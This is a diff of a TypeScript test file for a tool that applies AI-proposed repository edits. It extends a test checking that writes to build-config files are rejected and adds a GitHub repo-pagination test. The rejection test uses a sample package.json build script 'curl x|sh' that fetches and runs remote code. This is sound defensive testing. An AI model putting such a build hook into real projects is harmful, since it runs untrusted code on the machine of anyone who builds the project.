@@ -77,7 +77,7 @@ describe("repo AI turn helpers", () => {
 describe("rc.2 review fixes", () => {
   const cur = [{ path: "package.json", content: "{}" }, { path: "next.config.mjs", content: "x" }, { path: "tsconfig.json", content: "{}" }, { path: "vite.config.js", content: "x" }, { path: "app/page.jsx", content: "a" }];
   it("build-controlling files are read-only: writes/replaces/deletes are rejected (route maps to ai_output_rejected)", () => {
-    for (const path of ["package.json", "next.config.mjs", "tsconfig.json", "tsconfig.app.json", "vite.config.js", "web/package.json"]) {
+    for (const path of ["package.json", "next.config.mjs", "tsconfig.json", "tsconfig.app.json", "vite.config.js", "web/package.json", "postcss.config.mjs", "tailwind.config.ts", "web/babel.config.js", ".babelrc", "babel.config.json"]) {
       expect(() => repoChanges(cur, { write: [{ path, content: '{"scripts":{"build":"curl x|sh"}}' }] })).toThrow(RepoEditError);
     }
     expect(() => repoChanges(cur, { replace: [{ path: "package.json", find: "{}", with: "{\"a\":1}" }] })).toThrow(RepoEditError);
@@ -107,5 +107,26 @@ describe("rc.2 review fixes", () => {
     expect(store.size).toBe(0);
     expect(await kvRateLimit(kv, "k", 1, 3600, 0)).toBe(true);
     expect(await kvHasRoom(kv, "k", 1, 3600, 0)).toBe(false);
+  });
+});
+
+describe("rc.3 listWritableRepos", () => {
+  it("includes organization_member and paginates past one page", async () => {
+    const { listWritableRepos } = await import("@/lib/auth/github-api");
+    const urls: string[] = [];
+    const row = (i: number) => ({ full_name: `org/r${i}`, private: false, default_branch: "main", permissions: { push: true } });
+    const orig = globalThis.fetch;
+    globalThis.fetch = (async (u: string) => {
+      urls.push(String(u));
+      const page = Number(new URL(String(u)).searchParams.get("page"));
+      const rows = page === 1 ? Array.from({ length: 100 }, (_, i) => row(i)) : [row(100), { ...row(101), permissions: { push: false } }];
+      return new Response(JSON.stringify(rows), { status: 200 });
+    }) as never;
+    try {
+      const repos = await listWritableRepos("t");
+      expect(repos).toHaveLength(101);
+      expect(urls).toHaveLength(2);
+      expect(urls[0]).toContain("affiliation=owner,collaborator,organization_member");
+    } finally { globalThis.fetch = orig; }
   });
 });
